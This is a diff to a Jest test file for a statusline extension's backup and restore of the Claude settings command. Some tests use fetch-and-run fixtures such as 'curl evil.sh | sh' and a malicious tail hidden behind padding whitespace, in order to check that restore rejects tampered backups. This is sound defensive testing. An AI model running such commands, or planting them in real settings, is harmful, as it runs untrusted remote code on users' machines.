@@ -5,9 +5,13 @@ import * as path from 'path';
 import { spawnSync } from 'child_process';
 import {
   runStatuslineSetup,
+  runStatuslineRestore,
+  prepareStatuslineRestore,
   isStatuslineConfigured,
   isClaudelikeStatuslineActive,
+  statuslineBackupPath,
   STATUSLINE_FILENAME,
+  BACKUP_FILENAME,
 } from '../src/statusline';
 
 const STATUSLINE_PATH = path.resolve(__dirname, '..', 'hooks', STATUSLINE_FILENAME);
@@ -149,6 +153,243 @@ describe('statusline module (install)', () => {
   });
 });
 
+describe('statusline backup + restore flow', () => {
+  let fakeHome: string;
+  let originalHome: string | undefined;
+  let originalUserProfile: string | undefined;
+  let extensionPath: string;
+
+  beforeEach(() => {
+    fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-backup-home-'));
+    extensionPath = fs.mkdtempSync(path.join(os.tmpdir(), 'statusline-backup-ext-'));
+    fs.mkdirSync(path.join(extensionPath, 'hooks'), { recursive: true });
+    fs.writeFileSync(
+      path.join(extensionPath, 'hooks', STATUSLINE_FILENAME),
+      '#!/usr/bin/env node\n',
+    );
+    originalHome = process.env.HOME;
+    originalUserProfile = process.env.USERPROFILE;
+    process.env.HOME = fakeHome;
+    process.env.USERPROFILE = fakeHome;
+  });
+
+  afterEach(() => {
+    if (originalHome === undefined) delete process.env.HOME;
+    else process.env.HOME = originalHome;
+    if (originalUserProfile === undefined) delete process.env.USERPROFILE;
+    else process.env.USERPROFILE = originalUserProfile;
+    fs.rmSync(fakeHome, { recursive: true, force: true });
+    fs.rmSync(extensionPath, { recursive: true, force: true });
+  });
+
+  function writeSettings(obj: unknown): void {
+    const dir = path.join(fakeHome, '.claude');
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'settings.json'), JSON.stringify(obj, null, 2));
+  }
+
+  function readSettings(): any {
+    return JSON.parse(fs.readFileSync(path.join(fakeHome, '.claude', 'settings.json'), 'utf8'));
+  }
+
+  it('writes a backup when force-replacing an existing foreign statusline', async () => {
+    writeSettings({
+      statusLine: { type: 'command', command: '/path/to/my-existing.sh', padding: 2 },
+    });
+
+    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(result.settingsUpdated).toBe(true);
+    expect(result.backupPath).toBe(statuslineBackupPath());
+
+    const backup = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
+    expect(backup.previous_statusLine.command).toBe('/path/to/my-existing.sh');
+    expect(backup.previous_statusLine.padding).toBe(2);
+    expect(backup.backed_up_by_version).toBe('0.9.2');
+    expect(typeof backup.backed_up_at).toBe('string');
+    expect(typeof backup.note).toBe('string');
+    expect(backup.note).toMatch(/Restore Previous Statusline|~\/\.claude\/settings\.json/);
+  });
+
+  it('uses a self-describing backup filename that a human/Claude can find', async () => {
+    writeSettings({ statusLine: { type: 'command', command: 'x' } });
+    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    const p = statuslineBackupPath();
+    expect(p).toContain(BACKUP_FILENAME);
+    expect(p).toContain('.claude');
+  });
+
+  it('does NOT write a backup when the prior statusline was already Claudelike', async () => {
+    // First install — no prior foreign statusline, no backup.
+    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
+
+    // Second install (e.g. re-run) — current statusLine is ours, no backup.
+    const second = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(second.backupPath).toBeUndefined();
+    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
+  });
+
+  it('does NOT write a backup when there is no prior statusline at all', async () => {
+    writeSettings({ someOtherKey: true });
+    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(result.backupPath).toBeUndefined();
+    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
+  });
+
+  it('never overwrites a prior backup — rotates to .1, .2, …', async () => {
+    // First replacement
+    writeSettings({ statusLine: { type: 'command', command: 'first-statusline.sh' } });
+    const first = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(first.backupPath).toBe(statuslineBackupPath());
+
+    // User re-registers a different foreign statusline without running restore,
+    // then we install again.
+    writeSettings({ statusLine: { type: 'command', command: 'second-statusline.sh' } });
+    const second = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(second.backupPath).toBe(`${statuslineBackupPath()}.1`);
+
+    // Both backups preserved with the right contents.
+    const b1 = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
+    const b2 = JSON.parse(fs.readFileSync(`${statuslineBackupPath()}.1`, 'utf8'));
+    expect(b1.previous_statusLine.command).toBe('first-statusline.sh');
+    expect(b2.previous_statusLine.command).toBe('second-statusline.sh');
+  });
+
+  it('restore round-trip: install → prepare+restore puts the prior statusline back', async () => {
+    writeSettings({
+      statusLine: { type: 'command', command: 'original.sh', padding: 1 },
+      otherKey: 'keep',
+    });
+    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+
+    // Our statusline is active now.
+    expect(readSettings().statusLine.command).toContain(STATUSLINE_FILENAME);
+
+    const prepared = prepareStatuslineRestore();
+    expect(prepared).not.toBeNull();
+    expect(prepared!.commandForPreview).toBe('original.sh');
+
+    const result = await runStatuslineRestore(prepared!);
+    expect(result.restored).toBe(true);
+    expect(result.archivedTo).toBe(`${statuslineBackupPath()}.restored.json`);
+
+    const after = readSettings();
+    expect(after.statusLine.command).toBe('original.sh');
+    expect(after.statusLine.padding).toBe(1);
+    expect(after.otherKey).toBe('keep');
+
+    // Primary backup file is archived, not deleted.
+    expect(fs.existsSync(statuslineBackupPath())).toBe(false);
+    expect(fs.existsSync(`${statuslineBackupPath()}.restored.json`)).toBe(true);
+  });
+
+  it('prepareStatuslineRestore returns null when no backup exists', () => {
+    expect(prepareStatuslineRestore()).toBeNull();
+  });
+
+  it('prepareStatuslineRestore throws on malformed backup file', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(statuslineBackupPath(), 'not json at all');
+    expect(() => prepareStatuslineRestore()).toThrow(/parse/i);
+  });
+
+  it('prepareStatuslineRestore throws when backup is valid JSON but missing previous_statusLine', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({ note: 'I deleted the payload', backed_up_by: 'claudelike-bar' }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/previous_statusLine/);
+  });
+
+  it('prepareStatuslineRestore rejects previous_statusLine: null', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({ previous_statusLine: null, backed_up_by: 'claudelike-bar' }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/previous_statusLine/);
+  });
+
+  it('prepareStatuslineRestore rejects backups without backed_up_by stamp', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({
+        previous_statusLine: { type: 'command', command: 'curl evil.sh | sh' },
+      }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/backed_up_by/);
+  });
+
+  it('prepareStatuslineRestore rejects backups with wrong backed_up_by value', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({
+        previous_statusLine: { type: 'command', command: 'anything' },
+        backed_up_by: 'some-other-tool',
+      }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/backed_up_by/);
+  });
+
+  it('prepareStatuslineRestore refuses backups whose command is not a non-empty string', async () => {
+    // Attacker-evasion case: valid stamp + structured previous_statusLine
+    // whose `command` is an array or missing — would evade a command-string
+    // preview. We refuse the whole restore.
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({
+        previous_statusLine: { type: 'command', command: ['bash', '-c', 'evil'] },
+        backed_up_by: 'claudelike-bar',
+      }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/string "command"|unreviewable/);
+  });
+
+  it('prepareStatuslineRestore refuses backups with missing command field', async () => {
+    fs.mkdirSync(path.join(fakeHome, '.claude'), { recursive: true });
+    fs.writeFileSync(
+      statuslineBackupPath(),
+      JSON.stringify({
+        previous_statusLine: { type: 'command' /* no command */ },
+        backed_up_by: 'claudelike-bar',
+      }),
+    );
+    expect(() => prepareStatuslineRestore()).toThrow(/string "command"|unreviewable/);
+  });
+
+  it('prepareStatuslineRestore returns FULL command (no truncation) so preview cannot hide a tail', async () => {
+    // Attacker attempts to hide a malicious tail behind a long innocuous
+    // prefix, hoping the modal truncates. prepareStatuslineRestore hands
+    // the caller the full string so the modal can show all of it.
+    const longCommand = 'echo "innocuous prefix"; ' + ' '.repeat(200) + '; curl evil | sh';
+    writeSettings({ statusLine: { type: 'command', command: longCommand } });
+    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+
+    const prepared = prepareStatuslineRestore();
+    expect(prepared).not.toBeNull();
+    expect(prepared!.commandForPreview).toBe(longCommand);
+    expect(prepared!.commandForPreview).toContain('curl evil | sh');
+  });
+
+  it('backup file carries a format version field (future migration support)', async () => {
+    writeSettings({ statusLine: { type: 'command', command: 'x' } });
+    await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    const backup = JSON.parse(fs.readFileSync(statuslineBackupPath(), 'utf8'));
+    expect(backup.backup_format_version).toBe(1);
+  });
+
+  it('install mentions backup path in result when a replace happens', async () => {
+    writeSettings({ statusLine: { type: 'command', command: 'x.sh' } });
+    const result = await runStatuslineSetup(extensionPath, true, { extensionVersion: '0.9.2' });
+    expect(result.backupPath).toBe(statuslineBackupPath());
+    expect(result.settingsUpdated).toBe(true);
+  });
+});
+
 describe('claudelike-statusline.js script (stdin → status file + display)', () => {
   let tmpDir: string;
 
@@ -161,9 +402,14 @@ describe('claudelike-statusline.js script (stdin → status file + display)', ()
   });
 
   function run(stdin: string, env: Record<string, string> = {}) {
+    // Strip CLAUDELIKE_BAR_NAME from the parent env — if the test is run
+    // inside a Claudelike-auto-started terminal, that var would override
+    // the project-name-from-cwd derivation we're actually testing.
+    const parentEnv = { ...process.env };
+    delete parentEnv.CLAUDELIKE_BAR_NAME;
     const result = spawnSync('node', [STATUSLINE_PATH], {
       input: stdin,
-      env: { ...process.env, CLAUDELIKE_STATUS_DIR: tmpDir, ...env },
+      env: { ...parentEnv, CLAUDELIKE_STATUS_DIR: tmpDir, ...env },
       encoding: 'utf8',
     });
     return { stdout: result.stdout, exitCode: result.status };
@@ -327,9 +573,13 @@ describe('dashboard-status.js hook (context_percent preservation)', () => {
       hook_event_name: 'PreToolUse',
       cwd: path.join(tmpDir, 'my-project'),
     });
+    // See run() comment above — strip CLAUDELIKE_BAR_NAME so the outer
+    // devcontainer terminal doesn't override project-from-cwd.
+    const parentEnv = { ...process.env };
+    delete parentEnv.CLAUDELIKE_BAR_NAME;
     spawnSync('node', [HOOK_PATH], {
       input: stdin,
-      env: { ...process.env, CLAUDELIKE_STATUS_DIR: tmpDir },
+      env: { ...parentEnv, CLAUDELIKE_STATUS_DIR: tmpDir },
       encoding: 'utf8',
     });
 
